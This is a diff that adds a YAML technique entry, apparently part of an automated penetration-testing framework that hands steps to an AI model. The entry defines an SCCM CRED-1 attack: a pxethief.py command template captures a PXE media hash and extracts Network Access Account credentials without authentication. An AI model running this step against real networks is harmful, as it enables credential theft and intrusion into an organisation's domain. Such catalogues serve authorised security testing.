@@ -1,0 +1,31 @@
+name: sccm_pxe_hashcap
+category: sccm
+description: SCCM CRED-1 — capture PXE media-variable hash from PXE-enabled DP
+preconditions:
+- sccm_dp_identified
+- attacker_on_subnet
+parameters:
+  dp_ip: from_engagement.dp_ip
+  interface: from_engagement.interface
+command_template: pxethief.py 2 {interface}
+parser: generic_parser
+expected_effects:
+- pxe_hash_captured
+- sccm_naa_ciphertext_obtained
+- has_hash
+falsifier:
+  pattern: no response|timeout|PXE disabled|boot variable empty
+  timeout: 300
+model_tier: sonnet
+mechanism: 'SCCM PXE boot distributes an encrypted media file whose key material is
+  derived
+
+  from a fixed value. pxethief requests a boot, recovers the policy blob, and
+
+  extracts NAA credentials (CRED-1) without any auth. Requires PXE-enabled DP.
+
+  '
+references:
+  ocd_mindmap: 'Branch 12: SCCM CRED-1 (PXE media variable)'
+  hacktricks: windows-hardening/active-directory-methodology/pentesting-sccm.md
+hacktricks_ref: windows-hardening/active-directory-methodology/sccm-management-point-relay-sql-policy-secrets.md
